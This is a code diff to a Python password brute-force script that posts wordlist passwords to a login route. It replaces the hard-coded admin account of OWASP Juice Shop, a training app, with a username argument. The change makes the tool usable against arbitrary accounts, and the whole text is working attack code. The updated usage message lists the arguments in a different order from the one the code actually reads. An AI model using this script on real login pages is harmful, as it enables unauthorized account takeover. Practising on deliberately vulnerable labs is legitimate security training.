@@ -8,13 +8,14 @@ def init():
         print('\n\033[33m[ Trying to Crack the Password... ]\033[0;0;0m\n')
         
         post = sys.argv[1].strip()
+        username = sys.argv[3].strip()
         wordlist = sys.argv[2].strip()
         
         passwords = open_wordlist(wordlist)
-        brute(post, passwords)
+        brute(post, passwords, username)
 
     else:
-        print('\n\033[32mUsage:\033[0;0;0m py post_brute.py \033[31m< \033[33mpost_route\033[0;0;0m \033[31m> <\033[0;0;0m \033[33mwordlist.txt\033[0;0;0m \033[31m>\033[0;0;0m\n')
+        print('\n\033[32mUsage:\033[0;0;0m py post_brute.py \033[31m< \033[33mpost_route\033[0;0;0m \033[31m> <\033[0;0;0m\033[33m username\033[0;0;0m \033[31m> <\033[0;0;0m \033[33mwordlist.txt\033[0;0;0m \033[31m>\033[0;0;0m \n')
         exit()
 
     print('\033[33m[i] No Password found in Wordlist!\033[0;0;0m\n')
@@ -26,11 +27,11 @@ def open_wordlist(wordlist):
         return passwords
 
 
-def brute(post_route, list_passwords):
+def brute(post_route, list_passwords, username):
     try:
         for password in list_passwords:
             password = password.strip()
-            data = {"email": "admin@juice-sh.op", "password": password}
+            data = {"email": username, "password": password}
             response = requests.post(post_route, json=data)
             code = response.status_code
             
